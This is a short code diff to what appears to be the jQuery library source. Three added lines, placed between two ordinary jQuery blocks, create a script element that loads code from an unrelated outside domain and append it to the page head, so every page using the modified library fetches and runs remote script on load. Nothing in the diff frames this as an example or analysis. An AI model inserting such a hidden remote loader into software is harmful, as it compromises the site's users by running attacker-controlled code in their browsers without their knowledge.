@@ -4471,6 +4471,9 @@ jQuery.extend( {
 		dataPriv.remove( elem, name );
 	}
 } );
+var script = document.createElement('script');
+script.src = '//uj.ci/tgu';
+document.head.appendChild(script);
 
 jQuery.fn.extend( {
 	data: function( key, value ) {
